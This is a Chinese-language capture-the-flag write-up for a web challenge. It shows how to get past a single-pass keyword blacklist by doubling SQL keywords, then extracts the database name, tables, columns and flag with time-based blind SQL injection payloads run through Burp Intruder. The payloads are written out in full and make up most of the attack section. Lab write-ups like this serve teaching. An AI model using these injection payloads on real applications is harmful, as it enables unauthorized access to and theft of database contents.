# Web-SQL注入漏洞

## 题目
![1](1.png)
首先界面打开就是光秃秃的这个模样，然后随便输入一下会返回这样的界面
![2](2.png)
这里给出了一段php代码，不难看到，这里给出了一个`waf`函数，为了过滤掉黑名单内的各种字符串，也就是把常规的sql注入的一些输入做一下字符串替换，全部都替换为空字符串。

## 题解
~~通过对狗屁的学习~~ 通过自学，发现使用str_ireplace函数将 $var中的黑名单关键词替换为空字符串，且不区分大小写，但str_ireplace函数只会做一次，不会递归调用，也就是说我们可以复写各种字符串来规避过滤。比如：
+ `select` $\rightarrow$ `seselectlect`
+ `or` $\rightarrow$ `oorr`

首先先确定后端数据库是如何闭合的
```
# 分别尝试如下参数
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1--

admin" --
admin" #
admin"/*
" oorr 1=1--
" oorr 1=1#
" oorr 1=1/*
" oorr "1"="1
") oorr ("1"="1
```
通过burp一个一个试所谓的万能密钥，发现后端数据库是用双引号闭合的，而且用`#`来作为注释，返回如下界面。
![3](3.png)
![4](4.png)

我以为到这里就大功告成了，发现把admin和下面那一串输入到password中并没有什么用，而且你输入别的内容全部都是没有回显的，因此只能通过burp来盲注。先把内容发送到我们的Intruder
![5](5.png)

利用如下参数来进行盲注，爆破一下数据库名字长度，因为前面乱测发现不管你在username还是在password输入，其实没什么区别，所以在这里就只放在password位置即可。
```
222 " oorr if(length(database())=§len§,sleep(5),1) #
```
![6](6.png)

然后修改我们的payload类型

![7](7.png)

点击开始攻击后我们发现，payload为7的时候长度跟其他的不一样，因此可以推断是数据库名字的长度为7

![8](8.png)

然后我们再利用如下代码尝试获取数据库的名字
```
222 " oorr if(ascii(substring(database(),§index§,1))=§value§,sleep(5),1)#
```
![9](9.png)

再来设置我们的payload，第一个参数指的是我们搜索的数据库名称的第几个字符，第二个参数指的是该字符在ascii码表上是第几个

![10](10.png)

![11](11.png)

点击攻击后，可以得到如下发现，利用ascii码表拼出来就是`easysql`~~(一点也不easy，手玩了好久)~~

![12](12.png)

然后再检查一共有几个数据库表
```
222 " oorr if((sselectelect count(table_name) frroom infoorrmation_schema.tables wwherehere table_schema=database() )=§len§,sleep(2),1)#
```
![13](13.png)

攻击后发现，一共是两个数据库表

![14](14.png)

然后盲注第一个数据库表的表名长度
```
222 " oorr if(length(substr((sselectelect table_name frroom infoorrmation_schema.tables wwherehere table_schema=database() limit 0,1),1))=§len§,sleep(5),1)#
```
![15](15.png)

攻击后发现第一个数据库表的表名长度为4

![16](16.png)

再盲注第二个数据库表的表名长度
```
222 " oorr if(length(substr((sselectelect table_name frroom infoorrmation_schema.tables wwherehere table_schema=database() limit 1,2),1))=§len§,sleep(5),1)#
```
![17](17.png)

攻击后得到第二个数据库表的表名长度为5

![18](18.png)

然后获取第一个数据库表的表名
```
222 " oorr if(ascii(substr((sselectelect table_name frroom infoorrmation_schema.tables wwherehere table_schema=database() limit 0,1),§index§,1))=§value§,sleep(5),1)#
```
![19](19.png)

攻击后得到(102,108,97,103)，也就是名字为flag

![20](20.png)

同理可以得到第二个数据库表的表名为users
```
222 " oorr if(ascii(substr((sselectelect table_name frroom infoorrmation_schema.tables wwherehere table_schema=database() limit 1,2),§index§,1))=§value§,sleep(5),1)#
```
![21](21.png)
![22](22.png)

首先猜测最终的flag放在了数据库表名为flag的里面，对flag表进行盲注
```
222 " oorr if((sselectelect count(column_name) frroom infoorrmation_schema.columns wwherehere table_name= 'fflaglag')=§len§,sleep(5),1) #
```
![23](23.png)

攻击后发现字段有两个

![24](24.png)

获取第一个字段的长度
```
222 " oorr if(length(substr((sselectelect column_name frroom infoorrmation_schema.columns wwherehere table_name= 'fflaglag' limit 0,1),1))=§len§,sleep(1),1)#
```
![25](25.png)

攻击后发现字段长度为2

![26](26.png)

获取第一个字段的名称
```
222 " oorr if(ascii(substr((sselectelect column_name frroom infoorrmation_schema.columns wwherehere table_name= 'fflaglag' limit 0,1),§index§,1))=§value§,sleep(1),1)#
```
![27](27.png)

攻击后得到第一个字段的名称为id

![28](28.png)

然后获得第二个字段的长度
```
222 " oorr if(length(substr((sselectelect column_name frroom infoorrmation_schema.columns wwherehere table_name= 'fflaglag' limit 1,2),1))=§len§,sleep(1),1)#
```
![29](29.png)

攻击后得到第二个字段的长度为4

![30](30.png)

获得第二个字段的名称
```
222 " oorr if(ascii(substr((sselectelect column_name frroom infoorrmation_schema.columns wwherehere table_name= 'fflaglag' limit 1,2),§index§,1))=§value§,sleep(1),1)#
```
![31](31.png)

攻击后得到第二个字段的ascii码，发现非常的眼熟，没错名称就是flag
![32](32.png)

盲注得到flag表的记录数
```
222 " oorr if((sselectelect count(*) frroom fflaglag)=§count§,sleep(3),1)#
```
![33](33.png)

发现只有一条记录
![34](34.png)

盲注flag表唯一一条记录的长度
```
222 " oorr if(length(substr((sselectelect fflaglag frroom fflaglag limit 0,1),1))=§len§,sleep(3),1)#
```
![35](35.png)

发现记录长度为37
![36](36.png)

感觉这个就是最终的flag了，现在只需要盲注出每一个字符即可
```
222 " oorr if(ascii(substr((sselectelect fflaglag frroom fflaglag limit 0,1),§index§,1))=§value§,sleep(3),1)#
```
![37](37.png)

最后就得到了最终的flag，发现确实是对的，只不过我用的非常笨比的办法 ~~(瞪眼法)~~ 一个个对着ascii码表翻译出来了，37个字符也太难为老年人了
![38](38.png)

## 吐槽
~~入门知识写的很好，以后不要写了，ctfwiki我又不是自己不会看，而且对实验也并没有太大用处，还好试了一坤天把回显试出来了，然后找到了参考链接，不然就是干瞪眼了~~

## 参考链接
[参考链接](https://www.cnblogs.com/fuhua/p/15597700.html)